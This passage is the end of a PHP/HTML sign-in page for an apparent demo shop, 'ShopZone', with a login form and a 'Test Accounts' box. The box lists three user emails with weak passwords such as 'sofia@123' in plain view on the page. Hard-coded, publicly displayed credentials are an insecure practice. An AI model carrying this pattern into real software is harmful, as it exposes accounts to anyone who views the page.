    <script>setTimeout(function(){var m=document.getElementById('deletedMsg');m.style.opacity='0';setTimeout(function(){m.remove()},400)},5000);</script>
    <?php endif; ?>

    <?php if ($error): ?><div class="sz-error"><?= esc($error) ?></div><?php endif; ?>

    <form method="POST" action="/index.php">
      <div class="sz-field">
        <label>Email Address</label>
        <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
      </div>
      <div class="sz-field" style="margin-bottom:22px;">
        <label>Password</label>
        <input type="password" name="password" placeholder="Your password" required autocomplete="current-password">
      </div>
      <button type="submit" class="sz-btn sz-btn-full">Sign In</button>
    </form>

    <div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:8px;padding:10px 12px;margin-top:14px;font-size:11px;">
      <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#9CA3AF;margin-bottom:8px;">📋 Test Accounts</div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #FED7AA;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">sofia@shopzone.com</span><span style="font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;">sofia@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#FFEDD5;color:#EA580C;white-space:nowrap;">User</span></div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #FED7AA;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">james@shopzone.com</span><span style="font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;">james@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#FFEDD5;color:#EA580C;white-space:nowrap;">User</span></div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">nina@shopzone.com</span><span style="font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;">nina@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#FFEDD5;color:#EA580C;white-space:nowrap;">User</span></div>
    </div>

    <div class="sz-auth-footer">
      New customer? <a href="/index.php?action=register">Create an account</a>
    </div>
  </div>
</div>

<?php endif; ?>
</body>
</html>
